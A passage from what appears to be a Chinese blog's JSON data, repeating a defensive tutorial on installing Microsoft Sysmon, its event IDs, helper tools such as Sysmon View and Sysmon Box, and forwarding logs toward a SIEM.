href=\"#Sysmon原理\" class=\"headerlink\" title=\"Sysmon原理\"></a>Sysmon原理</h4><p>它通过系统服务和驱动程序实现记录进程创建、文件访问以及网络信息的记录，并把相关的信息写入并展示在windows的日志事件里。</p>\n<p>更多参考：<a href=\"https://www.anquanke.com/post/id/156704\">Sysmon原理与分析</a></p>\n<h5 id=\"Sysmon安装\"><a href=\"#Sysmon安装\" class=\"headerlink\" title=\"Sysmon安装\"></a>Sysmon安装</h5><p><a href=\"\">补丁</a></p>\n<p>Sysmon安装在VM中时会出现以下报错，则补丁更新即可解决。</p>\n<p>报错如下，说明系统缺少wevtapi的dll库文件，需更新<code>KB2533623</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error getting the evt dll (wevtapi.dll): 87</span><br></pre></td></tr></table></figure>\n\n<p>但出现以下报错，需更新此补丁<code>KB3033929</code><a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=46148\">补丁</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StartService failed for SysmonDrv:</span><br></pre></td></tr></table></figure>\n\n<p>安装方式一</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sysmon64.exe -i -h md5 -l -n</span><br><span class=\"line\">-i 即install</span><br><span class=\"line\">-n会监听network连接</span><br><span class=\"line\">sysmon有32位和64位两种，根据系统选择。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/image-20201016115903675.png\" alt=\"image-20201016115903675\"></p>\n<p>安装方式二</p>\n<p>网上提供对应配置文件</p>\n<p>sysmon可以使用xml配置文件进行安装，需要先配置好xml文件，该配置文件为大家过滤了一些不必要监控的系统行为以及选择捕捉适当的条目，可以在应急响应中，将注意力集中真正有意义的日志上，并尽可能减少性能影响。</p>\n<p><a href=\"https://github.com/SwiftOnSecurity/sysmon-config\">配置文件</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sysmon64 -accepteula -i sysmonconfig-export.xml</span><br><span class=\"line\">Sysmon64 -c sysmonconfig-export.xml</span><br></pre></td></tr></table></figure>\n\n<p>已经安装的话,无法再进行安装，可以使用<code>-c</code>参数进行更新安装方式即可。</p>\n<p><img src=\"/images/Sysmon/image-20201016135041924.png\" alt=\"image-20201016135041924\"></p>\n<h5 id=\"Sysmon卸载\"><a href=\"#Sysmon卸载\" class=\"headerlink\" title=\"Sysmon卸载\"></a>Sysmon卸载</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 通过以下方式对Sysmon进行卸载操作</span></span><br><span class=\"line\">Sysmon64.exe -u</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/image-20201016135157467.png\" alt=\"image-20201016135157467\"></p>\n<p>日志通过事件查看器查看，因为Sysmon的日志是以<code>evtx</code>格式存储。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eventvwr.msc</span><br></pre></td></tr></table></figure>\n\n<p>应用程序和服务日志-Microsoft-Windows-Sysmon-Operational</p>\n<p>如同Windows自带的系统日志，安全日志有事件ID一样，sysmon日志也有对应的事件ID，最新版本支持24种事件。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Event ID <span class=\"number\">1</span>: <span class=\"keyword\">Process</span> creation</span><br><span class=\"line\">Event ID <span class=\"number\">2</span>: A <span class=\"keyword\">process</span> changed a file creation time</span><br><span class=\"line\">Event ID <span class=\"number\">3</span>: Network connection</span><br><span class=\"line\">Event ID <span class=\"number\">4</span>: Sysmon service state changed</span><br><span class=\"line\">Event ID <span class=\"number\">5</span>: <span class=\"keyword\">Process</span> terminated</span><br><span class=\"line\">Event ID <span class=\"number\">6</span>: Driver loaded</span><br><span class=\"line\">Event ID <span class=\"number\">7</span>: Image loaded</span><br><span class=\"line\">Event ID <span class=\"number\">8</span>: CreateRemoteThread</span><br><span class=\"line\">Event ID <span class=\"number\">9</span>: RawAccessRead</span><br><span class=\"line\">Event ID <span class=\"number\">10</span>: ProcessAccess</span><br><span class=\"line\">Event ID <span class=\"number\">11</span>: FileCreate</span><br><span class=\"line\">Event ID <span class=\"number\">12</span>: RegistryEvent (Object create and delete)</span><br><span class=\"line\">Event ID <span class=\"number\">13</span>: RegistryEvent (Value <span class=\"built_in\">Set</span>)</span><br><span class=\"line\">Event ID <span class=\"number\">14</span>: RegistryEvent (Key and Value Rename)</span><br><span class=\"line\">Event ID <span class=\"number\">15</span>: FileCreateStreamHash</span><br><span class=\"line\">Event ID <span class=\"number\">17</span>: PipeEvent (Pipe Created)</span><br><span class=\"line\">Event ID <span class=\"number\">18</span>: PipeEvent (Pipe Connected)</span><br><span class=\"line\">Event ID <span class=\"number\">19</span>: WmiEvent (WmiEventFilter activity detected)</span><br><span class=\"line\">Event ID <span class=\"number\">20</span>: WmiEvent (WmiEventConsumer activity detected)</span><br><span class=\"line\">Event ID <span class=\"number\">21</span>: WmiEvent (WmiEventConsumerToFilter activity detected)</span><br><span class=\"line\">Event ID <span class=\"number\">22</span>: DNSEvent (DNS query)</span><br><span class=\"line\">Event ID <span class=\"number\">23</span>: FileDelete</span><br><span class=\"line\">Event ID <span class=\"number\">24</span>: Clipboard Changed</span><br><span class=\"line\">Event ID <span class=\"number\">255</span>: Error</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"事件ID\"><a href=\"#事件ID\" class=\"headerlink\" title=\"事件ID\"></a>事件ID</h5><h6 id=\"事件-ID-1\"><a href=\"#事件-ID-1\" class=\"headerlink\" title=\"事件 ID 1\"></a>事件 ID 1</h6><p>进程创建事件ID，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等。</p>\n<p><img src=\"/images/Sysmon/image-20201016142613582.png\" alt=\"image-20201016142613582\"></p>\n<h6 id=\"事件-ID-3\"><a href=\"#事件-ID-3\" class=\"headerlink\" title=\"事件 ID 3\"></a>事件 ID 3</h6><p>网络连接事件ID，当恶意程序外连CC服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</p>\n<p><img src=\"/images/Sysmon/image-20201016143121787.png\" alt=\"image-20201016143121787\"></p>\n<h6 id=\"事件-ID-11\"><a href=\"#事件-ID-11\" class=\"headerlink\" title=\"事件 ID 11\"></a>事件 ID 11</h6><p>文件创建事件ID，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用，而这些目录正是初始感染阶段恶意运行要用到的目录。</p>\n<p><img src=\"/images/Sysmon/image-20201016154726431.png\" alt=\"image-20201016154726431\"></p>\n<h6 id=\"事件-ID-15\"><a href=\"#事件-ID-15\" class=\"headerlink\" title=\"事件 ID 15\"></a>事件 ID 15</h6><p>创建命名文件流时记录。</p>\n<h6 id=\"事件-ID-22\"><a href=\"#事件-ID-22\" class=\"headerlink\" title=\"事件 ID 22\"></a>事件 ID 22</h6><p>记录DNS查询，容易受该功能影响的一种场景就是基于DNS的C2通信，其中大量请求会被记录下来。</p>\n<p>过滤Event ID 22，可以重点关注“DNS query”（DNS请求）事件。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/302292/1563418822549-1c945bff-a194-4c71-b5d8-4f9c71169f7b.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_U3djaGFyeg==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10\" alt=\"img\"></p>\n<center>图片来自\"语雀\"</center>\n###### 事件 ID 23\n\n<p>文件删除记录，</p>\n<p>Sysmon版本在12之后多了一个<code>事件 ID 24</code>用于记录剪切板事件。</p>\n<h6 id=\"事件-ID-24\"><a href=\"#事件-ID-24\" class=\"headerlink\" title=\"事件 ID 24\"></a>事件 ID 24</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 事件 ID 24</span><br><span class=\"line\">https:&#x2F;&#x2F;www.bleepingcomputer.com&#x2F;news&#x2F;microsoft&#x2F;microsoft-sysmon-now-logs-data-copied-to-the-windows-clipboard&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/logged-event.jpg\" alt=\"logged-event\"></p>\n<center>图片来自以上链接</center>\n#### Sysmon辅助\n\n<p><a href=\"https://github.com/nshalabi/SysmonTools.git\">Sysmon辅助工具</a></p>\n<p>Sysmon View：Sysmon日志可视化</p>\n<p>Sysmon Shell：Sysmon配置文件生成</p>\n<p>Sysmon Box：Sysmon和网络捕获日志记录</p>\n<h5 id=\"Sysmon-View\"><a href=\"#Sysmon-View\" class=\"headerlink\" title=\"Sysmon View\"></a>Sysmon View</h5><p>Sysmon View是Sysmon产生日志的可视化查看进程信息的辅助工具。</p>\n<p>cmd下执行以下命令导出<code>xml</code>格式的日志文档，可通过<code>Sysmon View</code>辅助工具实现对其可视化显示。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEVTUtil query-events &quot;Microsoft-Windows-Sysmon&#x2F;Operational&quot; &#x2F;format:xml &#x2F;e:sysmonview &gt; eventlog.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/image-20201017155404956.png\" alt=\"image-20201017155404956\"></p>\n<p><img src=\"/images/Sysmon/image-20201017155424676.png\" alt=\"image-20201017155424676\"></p>\n<p>如软件进程存在关联性会显示关联关系。</p>\n<p><img src=\"/images/Sysmon/image-20201017155537676.png\" alt=\"image-20201017155537676\"></p>\n<h5 id=\"Sysmon-Shell\"><a href=\"#Sysmon-Shell\" class=\"headerlink\" title=\"Sysmon Shell\"></a>Sysmon Shell</h5><p>Sysmon Shell是Sysmon用户自定义配置文档的GUI辅助工具。方便用户完成根据自己需求来自己书写自己的xml配置文档。</p>\n<p><img src=\"/images/Sysmon/image-20201017164457978.png\" alt=\"image-20201017164457978\"></p>\n<h5 id=\"Sysmon-Box\"><a href=\"#Sysmon-Box\" class=\"headerlink\" title=\"Sysmon Box\"></a>Sysmon Box</h5><p>可以通过Sysmon Box捕获sysmon和网络流量的数据库.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">启动Sysmon Box使用如下命令：SysmonBox -in Wi-Fi</span><br></pre></td></tr></table></figure>\n\n<p>然后该工具将执行以下操作：</p>\n<ol>\n<li><p>开始捕获流量(在后台使用tshark，这就是你必须指定捕获接口的原因)，完成后点击CTRL + C结束会话</p>\n</li>\n<li><p>然后，Sysmon Box将停止流量捕获，将所有捕获的数据包转储到文件，并使用EVT实用程序导出在会话的开始和结束时间之间记录的Sysmon日志</p>\n</li>\n<li><p>使用来自Sysmon的导入日志和捕获的流量构建Sysmon View数据库(备份现有)文件，您所要做的就是从同一文件夹运行Sysmon视图或将数据库文件(SysmonViewDB)放在与Sysmon View相同的文件夹中(保持数据包捕获在同一位置)</p>\n</li>\n</ol>\n<h4 id=\"Sysmon与SIEM系统\"><a href=\"#Sysmon与SIEM系统\" class=\"headerlink\" title=\"Sysmon与SIEM系统\"></a>Sysmon与SIEM系统</h4><h5 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h5><p>Windows操作系统因本身的安全特点经常成为内网安全渗透的首选目标，如果终端上没有安装EDR产品，基于Windows本身的日志很难监控到入侵行为。</p>\n<p>因此需使用Sysmon及其他日志分析工具相结合来对系统或整个网络环境进行监控和分析。</p>\n<h5 id=\"实战\"><a href=\"#实战\" class=\"headerlink\" title=\"实战\"></a>实战</h5><p><a href=\"https://nxlog.co/\">nxlog</a></p>\n<p>Nxlog主要作用是进行日志转换并发送至syslog服务器中的一款工具。</p>\n<p><img src=\"/images/Sysmon/image-20201020085647637.png\" alt=\"image-20201020085647637\"></p>\n<p>配置安装路径</p>\n<p><img src=\"/images/Sysmon/image-20201020085722321.png\" alt=\"image-20201020085722321\"></p>\n<p><img src=\"/images/Sysmon/image-20201020085743662.png\" alt=\"image-20201020085743662\"></p>\n<p><img src=\"/images/Sysmon/image-20201020085801552.png\" alt=\"image-20201020085801552\"></p>\n<p><img src=\"/images/Sysmon/image-20201020085823438.png\" alt=\"image-20201020085823438\"></p>\n<p>受限于Splunk与国内出口协议规定，目前无法下载。</p>\n<p>后期再补上吧！！</p>\n<h4 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1041591</span><br><span class=\"line\">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;156704</span><br><span class=\"line\">Sysmon DNS查询</span><br><span class=\"line\">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;180418</span><br><span class=\"line\">报错解决：</span><br><span class=\"line\">https:&#x2F;&#x2F;superuser.com&#x2F;questions&#x2F;1482486&#x2F;installation-error-of-sysmon-on-windows-7-vm-sysmondrv-driver-and-startservice</span><br><span class=\"line\">辅助工具：</span><br><span class=\"line\">https:&#x2F;&#x2F;www.yuque.com&#x2F;p1ut0&#x2F;xer98r&#x2F;ugrtrf</span><br><span class=\"line\">Sysmon官方文档</span><br><span class=\"line\">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;sysmon</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"实战参考\"><a href=\"#实战参考\" class=\"headerlink\" title=\"实战参考\"></a>实战参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># Sysmon实战分析Word恶意文件</span><br><span class=\"line\">https:&#x2F;&#x2F;www.syspanda.com&#x2F;index.php&#x2F;2017&#x2F;10&#x2F;10&#x2F;threat-hunting-sysmon-word-document-macro&#x2F;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Sysmon概述\"><a href=\"#Sysmon概述\" class=\"headerlink\" title=\"Sysmon概述\"></a>Sysmon概述</h4><p>Sysmon 是 Windows Sysinternals 系列中的一款工具。如果你想实时监控 Windows 系统又对其他第三方软件有顾虑，使用 Sysmon 这款轻量级 Microsoft 自带内部软件是最好的选择。</p>\n<p>应用打开或任何进程创建行为发生时，Sysmon 会使用 sha1（默认），MD5，SHA256 或 IMPHASH 记录进程镜像文件的 hash 值，包含进程创建过程中的进程 GUID，每个事件中包含 session 的 GUID。除此之外记录磁盘和卷的读取请求 / 网络连接（包括每个连接的源进程，IP 地址，端口号，主机名和端口名），重要的是还可在生成初期进程事件能记录在复杂的内核模式运行的恶意软件。</p>\n<p>项目地址：<a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\">Sysmon</a></p>\n<h4 id=\"Sysmon原理\"><a href=\"#Sysmon原理\" class=\"headerlink\" title=\"Sysmon原理\"></a>Sysmon原理</h4><p>它通过系统服务和驱动程序实现记录进程创建、文件访问以及网络信息的记录，并把相关的信息写入并展示在windows的日志事件里。</p>\n<p>更多参考：<a href=\"https://www.anquanke.com/post/id/156704\">Sysmon原理与分析</a></p>\n<h5 id=\"Sysmon安装\"><a href=\"#Sysmon安装\" class=\"headerlink\" title=\"Sysmon安装\"></a>Sysmon安装</h5><p><a href=\"\">补丁</a></p>\n<p>Sysmon安装在VM中时会出现以下报错，则补丁更新即可解决。</p>\n<p>报错如下，说明系统缺少wevtapi的dll库文件，需更新<code>KB2533623</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error getting the evt dll (wevtapi.dll): 87</span><br></pre></td></tr></table></figure>\n\n<p>但出现以下报错，需更新此补丁<code>KB3033929</code><a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=46148\">补丁</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StartService failed for SysmonDrv:</span><br></pre></td></tr></table></figure>\n\n<p>安装方式一</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sysmon64.exe -i -h md5 -l -n</span><br><span class=\"line\">-i 即install</span><br><span class=\"line\">-n会监听network连接</span><br><span class=\"line\">sysmon有32位和64位两种，根据系统选择。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/image-20201016115903675.png\" alt=\"image-20201016115903675\"></p>\n<p>安装方式二</p>\n<p>网上提供对应配置文件</p>\n<p>sysmon可以使用xml配置文件进行安装，需要先配置好xml文件，该配置文件为大家过滤了一些不必要监控的系统行为以及选择捕捉适当的条目，可以在应急响应中，将注意力集中真正有意义的日志上，并尽可能减少性能影响。</p>\n<p><a href=\"https://github.com/SwiftOnSecurity/sysmon-config\">配置文件</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Sysmon64 -accepteula -i sysmonconfig-export.xml</span><br><span class=\"line\">Sysmon64 -c sysmonconfig-export.xml</span><br></pre></td></tr></table></figure>\n\n<p>已经安装的话,无法再进行安装，可以使用<code>-c</code>参数进行更新安装方式即可。</p>\n<p><img src=\"/images/Sysmon/image-20201016135041924.png\" alt=\"image-20201016135041924\"></p>\n<h5 id=\"Sysmon卸载\"><a href=\"#Sysmon卸载\" class=\"headerlink\" title=\"Sysmon卸载\"></a>Sysmon卸载</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 通过以下方式对Sysmon进行卸载操作</span></span><br><span class=\"line\">Sysmon64.exe -u</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/image-20201016135157467.png\" alt=\"image-20201016135157467\"></p>\n<p>日志通过事件查看器查看，因为Sysmon的日志是以<code>evtx</code>格式存储。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eventvwr.msc</span><br></pre></td></tr></table></figure>\n\n<p>应用程序和服务日志-Microsoft-Windows-Sysmon-Operational</p>\n<p>如同Windows自带的系统日志，安全日志有事件ID一样，sysmon日志也有对应的事件ID，最新版本支持24种事件。</p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Event ID <span class=\"number\">1</span>: <span class=\"keyword\">Process</span> creation</span><br><span class=\"line\">Event ID <span class=\"number\">2</span>: A <span class=\"keyword\">process</span> changed a file creation time</span><br><span class=\"line\">Event ID <span class=\"number\">3</span>: Network connection</span><br><span class=\"line\">Event ID <span class=\"number\">4</span>: Sysmon service state changed</span><br><span class=\"line\">Event ID <span class=\"number\">5</span>: <span class=\"keyword\">Process</span> terminated</span><br><span class=\"line\">Event ID <span class=\"number\">6</span>: Driver loaded</span><br><span class=\"line\">Event ID <span class=\"number\">7</span>: Image loaded</span><br><span class=\"line\">Event ID <span class=\"number\">8</span>: CreateRemoteThread</span><br><span class=\"line\">Event ID <span class=\"number\">9</span>: RawAccessRead</span><br><span class=\"line\">Event ID <span class=\"number\">10</span>: ProcessAccess</span><br><span class=\"line\">Event ID <span class=\"number\">11</span>: FileCreate</span><br><span class=\"line\">Event ID <span class=\"number\">12</span>: RegistryEvent (Object create and delete)</span><br><span class=\"line\">Event ID <span class=\"number\">13</span>: RegistryEvent (Value <span class=\"built_in\">Set</span>)</span><br><span class=\"line\">Event ID <span class=\"number\">14</span>: RegistryEvent (Key and Value Rename)</span><br><span class=\"line\">Event ID <span class=\"number\">15</span>: FileCreateStreamHash</span><br><span class=\"line\">Event ID <span class=\"number\">17</span>: PipeEvent (Pipe Created)</span><br><span class=\"line\">Event ID <span class=\"number\">18</span>: PipeEvent (Pipe Connected)</span><br><span class=\"line\">Event ID <span class=\"number\">19</span>: WmiEvent (WmiEventFilter activity detected)</span><br><span class=\"line\">Event ID <span class=\"number\">20</span>: WmiEvent (WmiEventConsumer activity detected)</span><br><span class=\"line\">Event ID <span class=\"number\">21</span>: WmiEvent (WmiEventConsumerToFilter activity detected)</span><br><span class=\"line\">Event ID <span class=\"number\">22</span>: DNSEvent (DNS query)</span><br><span class=\"line\">Event ID <span class=\"number\">23</span>: FileDelete</span><br><span class=\"line\">Event ID <span class=\"number\">24</span>: Clipboard Changed</span><br><span class=\"line\">Event ID <span class=\"number\">255</span>: Error</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"事件ID\"><a href=\"#事件ID\" class=\"headerlink\" title=\"事件ID\"></a>事件ID</h5><h6 id=\"事件-ID-1\"><a href=\"#事件-ID-1\" class=\"headerlink\" title=\"事件 ID 1\"></a>事件 ID 1</h6><p>进程创建事件ID，恶意进程的创建，包括他的父进程，PID，执行命令及对应文件所在目录记录信息等等。</p>\n<p><img src=\"/images/Sysmon/image-20201016142613582.png\" alt=\"image-20201016142613582\"></p>\n<h6 id=\"事件-ID-3\"><a href=\"#事件-ID-3\" class=\"headerlink\" title=\"事件 ID 3\"></a>事件 ID 3</h6><p>网络连接事件ID，当恶意程序外连CC服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</p>\n<p><img src=\"/images/Sysmon/image-20201016143121787.png\" alt=\"image-20201016143121787\"></p>\n<h6 id=\"事件-ID-11\"><a href=\"#事件-ID-11\" class=\"headerlink\" title=\"事件 ID 11\"></a>事件 ID 11</h6><p>文件创建事件ID，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用，而这些目录正是初始感染阶段恶意运行要用到的目录。</p>\n<p><img src=\"/images/Sysmon/image-20201016154726431.png\" alt=\"image-20201016154726431\"></p>\n<h6 id=\"事件-ID-15\"><a href=\"#事件-ID-15\" class=\"headerlink\" title=\"事件 ID 15\"></a>事件 ID 15</h6><p>创建命名文件流时记录。</p>\n<h6 id=\"事件-ID-22\"><a href=\"#事件-ID-22\" class=\"headerlink\" title=\"事件 ID 22\"></a>事件 ID 22</h6><p>记录DNS查询，容易受该功能影响的一种场景就是基于DNS的C2通信，其中大量请求会被记录下来。</p>\n<p>过滤Event ID 22，可以重点关注“DNS query”（DNS请求）事件。</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2019/png/302292/1563418822549-1c945bff-a194-4c71-b5d8-4f9c71169f7b.png?x-oss-process=image/watermark,type_d3F5LW1pY3JvaGVp,size_14,text_U3djaGFyeg==,color_FFFFFF,shadow_50,t_80,g_se,x_10,y_10\" alt=\"img\"></p>\n<center>图片来自\"语雀\"</center>\n###### 事件 ID 23\n\n<p>文件删除记录，</p>\n<p>Sysmon版本在12之后多了一个<code>事件 ID 24</code>用于记录剪切板事件。</p>\n<h6 id=\"事件-ID-24\"><a href=\"#事件-ID-24\" class=\"headerlink\" title=\"事件 ID 24\"></a>事件 ID 24</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 事件 ID 24</span><br><span class=\"line\">https:&#x2F;&#x2F;www.bleepingcomputer.com&#x2F;news&#x2F;microsoft&#x2F;microsoft-sysmon-now-logs-data-copied-to-the-windows-clipboard&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/logged-event.jpg\" alt=\"logged-event\"></p>\n<center>图片来自以上链接</center>\n#### Sysmon辅助\n\n<p><a href=\"https://github.com/nshalabi/SysmonTools.git\">Sysmon辅助工具</a></p>\n<p>Sysmon View：Sysmon日志可视化</p>\n<p>Sysmon Shell：Sysmon配置文件生成</p>\n<p>Sysmon Box：Sysmon和网络捕获日志记录</p>\n<h5 id=\"Sysmon-View\"><a href=\"#Sysmon-View\" class=\"headerlink\" title=\"Sysmon View\"></a>Sysmon View</h5><p>Sysmon View是Sysmon产生日志的可视化查看进程信息的辅助工具。</p>\n<p>cmd下执行以下命令导出<code>xml</code>格式的日志文档，可通过<code>Sysmon View</code>辅助工具实现对其可视化显示。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WEVTUtil query-events &quot;Microsoft-Windows-Sysmon&#x2F;Operational&quot; &#x2F;format:xml &#x2F;e:sysmonview &gt; eventlog.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Sysmon/image-20201017155404956.png\" alt=\"image-20201017155404956\"></p>\n<p><img src=\"/images/Sysmon/image-20201017155424676.png\" alt=\"image-20201017155424676\"></p>\n<p>如软件进程存在关联性会显示关联关系。</p>\n<p><img src=\"/images/Sysmon/image-20201017155537676.png\" alt=\"image-20201017155537676\"></p>\n<h5 id=\"Sysmon-Shell\"><a href=\"#Sysmon-Shell\" class=\"headerlink\" title=\"Sysmon Shell\"></a>Sysmon Shell</h5><p>Sysmon Shell是Sysmon用户自定义配置文档的GUI辅助工具。方便用户完成根据自己需求来自己书写自己的xml配置文档。</p>\n<p><img src=\"/images/Sysmon/image-20201017164457978.png\" alt=\"image-20201017164457978\"></p>\n<h5 id=\"Sysmon-Box\"><a href=\"#Sysmon-Box\" class=\"headerlink\" title=\"Sysmon Box\"></a>Sysmon Box</h5><p>可以通过Sysmon Box捕获sysmon和网络流量的数据库.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">启动Sysmon Box使用如下命令：SysmonBox -in Wi-Fi</span><br></pre></td></tr></table></figure>\n\n<p>然后该工具将执行以下操作：</p>\n<ol>\n<li><p>开始捕获流量(在后台使用tshark，这就是你必须指定捕获接口的原因)，完成后点击CTRL + C结束会话</p>\n</li>\n<li><p>然后，Sysmon Box将停止流量捕获，将所有捕获的数据包转储到文件，并使用EVT实用程序导出在会话的开始和结束时间之间记录的Sysmon日志</p>\n</li>\n<li><p>使用来自Sysmon的导入日志和捕获的流量构建Sysmon View数据库(备份现有)文件，您所要做的就是从同一文件夹运行Sysmon视图或将数据库文件(SysmonViewDB)放在与Sysmon View相同的文件夹中(保持数据包捕获在同一位置)</p>\n</li>\n</ol>\n<h4 id=\"Sysmon与SIEM系统\"><a href=\"#Sysmon与SIEM系统\" class=\"headerlink\" title=\"Sysmon与SIEM系统\"></a>Sysmon与SIEM系统</h4><h5 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" 